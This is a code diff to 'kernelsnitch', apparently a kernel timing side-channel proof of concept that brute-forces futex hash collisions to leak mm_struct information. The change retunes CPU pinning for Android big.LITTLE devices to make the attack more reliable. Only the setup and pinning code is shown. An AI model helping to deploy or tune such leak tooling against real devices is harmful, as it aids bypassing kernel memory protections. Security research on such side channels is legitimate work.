@@ -356,7 +356,11 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
         ks->thread_cnt,
         ks->collisions,
         ks->mte_enabled ? "enabled" : "disabled");
-    pin_to_core(0);
+    /* Pin collision-measurement thread to the designated performance core so
+     * that futex hash timing is not disturbed by IRQ/binder preemptions that
+     * Android routes to the LITTLE cluster (CPUs 0-3).  CORE is defined in
+     * common.h and must be set before including this header. */
+    pin_to_core(CORE);
     futex_init();
 
     ks->state = KERNELSNITCH_INIT;
@@ -519,7 +523,10 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
 #endif
     ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
     if (ks->verbose) pr_info("start bruteforcing\n");
-    reset_cpu_pin();
+    /* Restrict brute-force worker threads to mid/big clusters (CPUs 4-9).
+     * LITTLE cores (0-3) carry Android binder/IRQ load; allowing workers
+     * there adds cache pollution and unpredictable scheduling delays. */
+    set_perf_cluster_pin();
 
     for (size_t i = 0; i < ks->thread_cnt; ++i) {
         struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
